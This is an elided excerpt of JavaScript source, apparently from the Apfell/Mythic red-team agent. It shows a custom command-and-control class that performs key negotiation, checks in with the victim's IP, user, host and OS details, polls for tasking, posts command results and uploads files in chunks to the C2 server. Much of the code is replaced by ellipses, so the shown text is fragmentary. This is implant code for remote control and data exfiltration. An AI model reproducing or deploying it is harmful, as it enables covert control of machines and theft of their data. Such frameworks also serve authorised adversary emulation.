...
class customC2 extends baseC2{
	constructor(interval, baseurl){
		...
		this.url = "api/v" + this.api_version + "/agent_message/";
  ...
  gen_sleep_time(){
	...
	negotiate_key(){
	    ...
	    while(true){
	        try{
	        	let stage1 = this.htmlPostData(this.url, initial_message, apfell.uuid);
	...
	checkin(ip, pid, user, host, os, arch){
        ...
        if(this.using_key_exchange){
            ...
            var jsondata = this.htmlPostData(this.url, info, sessionID);
        }else{
            var jsondata = this.htmlPostData(this.url, info, apfell.uuid);
        }
	...
	getTasking(){
		while(true){
		    try{
				...
				let task = this.htmlGetData(this.url);
	...
	postResponse(task, output){
	    ...
	    return this.postRESTResponse(this.url, output, task.id);
	}
	postRESTResponse(urlEnding, data, tid){
		//depending on the amount of data we're sending, we might need to chunk it
		data["task_id"] =  tid;
		let postData = {"action": "post_response", "responses": [data]};
		return this.htmlPostData(urlEnding, postData, apfell.id);
	}
	htmlPostData(urlEnding, sendData, uid, json=true){
	...
	upload(task, file_id, full_path){
	    try{
            ...
            do{
            	let file_data = this.htmlPostData(this.url, data, apfell.id);
            	...
            	data = {"action": "upload", "file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1};
